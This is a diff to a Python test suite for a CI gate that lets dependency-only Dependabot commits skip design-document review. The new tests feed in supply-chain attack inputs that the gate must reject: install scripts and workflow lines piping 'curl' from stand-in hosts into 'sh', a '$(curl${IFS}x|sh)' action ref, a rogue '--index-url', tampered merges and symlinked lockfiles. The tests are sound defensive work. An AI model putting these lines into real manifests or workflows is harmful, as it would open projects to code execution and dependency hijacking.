@@ -20,6 +20,8 @@ DOC = "# Vivary high-level design\n\n" + "\n\n".join(
 )
 
 DEPENDABOT = "dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>"
+HUMAN = "HLDD test <hldd@example.invalid>"
+MISSING = "HLDD review missing"
 WORKFLOW = f"""name: ci
 on: push
 jobs:
@@ -43,7 +45,7 @@ dependencies = ["packaging>=24.0", "tomli>=2.0; python_version < '3.11'"]
 test = ["pytest[testing]>=8.0"]
 
 [dependency-groups]
-dev = ["ruff>=0.5"]
+dev = ["ruff>=0.5", "mypy (>= 1.10, < 2)"]
 lint = [{include-group = "dev"}]
 """
 
@@ -100,6 +102,10 @@ class HlddGateTests(unittest.TestCase):
         result = self.run_command(sys.executable, "scripts/check_hldd.py", *args)
         self.assertEqual(result.returncode == 0, success, result.stdout + result.stderr)
         return result
+
+    def reject(self, *args, failure=MISSING):
+        # A crash also exits nonzero, so a rejection must name its reason.
+        self.assertIn(failure, self.gate(*args, success=False).stderr)
 
     def write(self, path, text):
         target = self.root / path
@@ -243,12 +249,17 @@ class HlddGateTests(unittest.TestCase):
         self.git("add", ".")
         self.git("commit", "-qm", "Bump dependencies", f"--author={author}")
 
-    def reject_dependabot(self, base, cases):
+    def reject_dependabot(self, base, cases, failure=MISSING):
         for name, files in cases.items():
             with self.subTest(case=name):
                 self.commit_as(DEPENDABOT, files)
-                self.gate("--base", base, success=False)
+                self.reject("--base", base, failure=failure)
                 self.git("reset", "-q", "--hard", base)
+
+    def dependabot_branch(self, files):
+        self.git("switch", "-qc", "dependabot")
+        self.commit_as(DEPENDABOT, files)
+        self.git("switch", "-q", "-")
 
     def test_dependabot_package_and_lockfile_bump_passes(self):
         base = self.seed({"site/package.json": package(), "site/package-lock.json": lockfile("7.3.2")})
@@ -257,7 +268,26 @@ class HlddGateTests(unittest.TestCase):
             "site/package-lock.json": lockfile("7.3.3"),
         })
         result = self.gate("--base", base)
-        self.assertIn("1 of them dependency-only Dependabot update(s)", result.stdout)
+        self.assertIn("1 of them dependency-only update(s)", result.stdout)
+
+    def test_merged_dependabot_pull_request_passes(self):
+        base = self.seed({"site/package.json": package(), "site/package-lock.json": lockfile("7.3.2")})
+        self.dependabot_branch({
+            "site/package.json": package(dependencies={"astro": "^7.3.3"}),
+            "site/package-lock.json": lockfile("7.3.3"),
+        })
+        self.git("merge", "-q", "--no-ff", "dependabot", "-m", "Merge pull request from dependabot")
+        result = self.gate("--base", base, "--head", "HEAD")
+        self.assertIn("2 introduced commit(s), 2 of them dependency-only update(s)", result.stdout)
+
+    def test_merge_that_changes_a_dependency_file_itself_fails(self):
+        base = self.seed({"site/package-lock.json": lockfile("7.3.2")})
+        self.dependabot_branch({"site/package-lock.json": lockfile("7.3.3")})
+        self.git("merge", "-q", "--no-ff", "--no-commit", "dependabot")
+        self.write("site/package-lock.json", lockfile("6.6.6"))
+        self.git("add", "site/package-lock.json")
+        self.git("commit", "-qm", "evil merge")
+        self.reject("--base", base)
 
     def test_dependabot_workflow_action_bump_passes(self):
         base = self.seed({".github/workflows/ci.yml": WORKFLOW})
@@ -273,7 +303,7 @@ class HlddGateTests(unittest.TestCase):
         for old, new in (
             ("setuptools>=68", "setuptools>=70"), ("packaging>=24.0", "packaging>=25.0"),
             ("tomli>=2.0", "tomli>=2.2"), ("pytest[testing]>=8.0", "pytest[testing]>=8.3"),
-            ("ruff>=0.5", "ruff>=0.6"),
+            ("ruff>=0.5", "ruff>=0.6"), ("mypy (>= 1.10, < 2)", "mypy (>= 1.11, < 3)"),
         ):
             bumped = bumped.replace(old, new)
         self.commit_as(DEPENDABOT, {"packages/tropo/pyproject.toml": bumped})
@@ -285,14 +315,18 @@ class HlddGateTests(unittest.TestCase):
             "site/package.json": package(dependencies={"astro": "^7.3.3"}),
             "packages/example/app.py": "value = 9\n",
         })
-        self.gate("--base", base, success=False)
+        self.reject("--base", base)
 
     def test_dependabot_package_change_outside_dependency_maps_fails(self):
         base = self.seed({"site/package.json": package()})
+        shadowed = package().replace(
+            '  "name": "site",\n', '  "name": "site",\n  "scripts": {"install": "curl example.invalid"},\n', 1,
+        )
         self.reject_dependabot(base, {
             "scripts": {"site/package.json": package(scripts={"build": "astro build && curl example.invalid"})},
             "own version": {"site/package.json": package(version="2.0.0")},
             "added dependency": {"site/package.json": package(dependencies={"extra": "^1.0.0"})},
+            "duplicate key": {"site/package.json": shadowed},
         })
 
     def test_dependabot_switch_to_source_dependency_fails(self):
@@ -302,11 +336,33 @@ class HlddGateTests(unittest.TestCase):
             "file": {"site/package.json": package(dependencies={"astro": "file:../astro"})},
         })
 
+    def test_dependabot_npm_value_that_is_not_a_version_fails(self):
+        base = self.seed({"site/package.json": package()})
+        self.reject_dependabot(base, {
+            value: {"site/package.json": package(dependencies={"astro": value})}
+            for value in ("evil.tgz", "7.3.3.tgz", "latest", "..", "")
+        })
+
+    def test_dependabot_lockfile_mode_or_type_change_fails(self):
+        base = self.seed({"site/package-lock.json": lockfile("7.3.2")})
+        lock = self.root / "site/package-lock.json"
+        lock.chmod(0o755)
+        self.commit_as(DEPENDABOT, {})
+        self.reject("--base", base)
+        self.git("reset", "-q", "--hard", base)
+        lock.unlink()
+        lock.symlink_to("package.json")
+        self.commit_as(DEPENDABOT, {})
+        self.reject("--base", base)
+
     def test_dependabot_workflow_change_outside_action_refs_fails(self):
         base = self.seed({".github/workflows/ci.yml": WORKFLOW})
         self.reject_dependabot(base, {
             "run line": {".github/workflows/ci.yml": WORKFLOW.replace("echo build", "curl example.invalid | sh")},
             "action owner": {".github/workflows/ci.yml": WORKFLOW.replace("actions/checkout@", "someone/checkout@")},
+            "branch ref": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", "checkout@main")},
+            "shell ref": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", "checkout@$(curl${IFS}x|sh)")},
+            "shell comment": {".github/workflows/ci.yml": WORKFLOW.replace("# v7.0.0", "# $(curl example.invalid)")},
         })
 
     def test_dependabot_pyproject_marker_or_name_change_fails(self):
@@ -317,18 +373,35 @@ class HlddGateTests(unittest.TestCase):
             "direct URL": {"packages/tropo/pyproject.toml": PYPROJECT.replace(
                 "packaging>=24.0", "packaging @ https://example.invalid/packaging.whl",
             )},
+            "trailing option": {"packages/tropo/pyproject.toml": PYPROJECT.replace(
+                "packaging>=24.0", "packaging>=25.0 --index-url https://evil.invalid",
+            )},
         })
+
+    def test_exempt_commit_that_guts_the_hldd_fails(self):
+        base = self.seed({"site/package-lock.json": lockfile("7.3.2")})
+        document = (self.root / "docs/ARCHITECTURE.md").read_text()
+        gutted = {"docs/ARCHITECTURE.md": "# Gutted\n"}
+        self.commit_as(DEPENDABOT, {"site/package-lock.json": lockfile("7.3.3"), **gutted})
+        self.commit_as(HUMAN, {"docs/ARCHITECTURE.md": document})
+        self.reject("--base", base, failure="HLDD needs a nonempty")
+        self.git("reset", "-q", "--hard", base)
+        self.dependabot_branch({"site/package-lock.json": lockfile("7.3.3")})
+        self.git("merge", "-q", "--no-ff", "--no-commit", "dependabot")
+        self.commit_as(HUMAN, gutted)
+        self.commit_as(HUMAN, {"docs/ARCHITECTURE.md": document})
+        self.reject("--base", base, failure="HLDD needs a nonempty")
 
     def test_human_lockfile_only_commit_fails(self):
         base = self.seed({"site/package-lock.json": lockfile("7.3.2")})
-        self.commit_as("HLDD test <hldd@example.invalid>", {"site/package-lock.json": lockfile("7.3.3")})
-        self.gate("--base", base, success=False)
+        self.commit_as(HUMAN, {"site/package-lock.json": lockfile("7.3.3")})
+        self.reject("--base", base)
 
     def test_staged_lockfile_only_change_is_never_exempt(self):
         self.seed({"site/package-lock.json": lockfile("7.3.2")})
         self.write("site/package-lock.json", lockfile("7.3.3"))
         self.git("add", "site/package-lock.json")
-        self.gate("--staged", success=False)
+        self.reject("--staged")
 
     def test_success_output_counts_dependabot_updates(self):
         base = self.seed({"site/package-lock.json": lockfile("7.3.2")})
@@ -340,9 +413,8 @@ class HlddGateTests(unittest.TestCase):
         self.commit_as(DEPENDABOT, {"site/package-lock.json": lockfile("7.3.3")})
         self.assertEqual(
             self.gate("--base", base).stdout,
-            "HLDD review passed for 2 introduced commit(s), 1 of them dependency-only Dependabot update(s).\n",
+            "HLDD review passed for 2 introduced commit(s), 1 of them dependency-only update(s).\n",
         )
-
 
 if __name__ == "__main__":
     unittest.main()
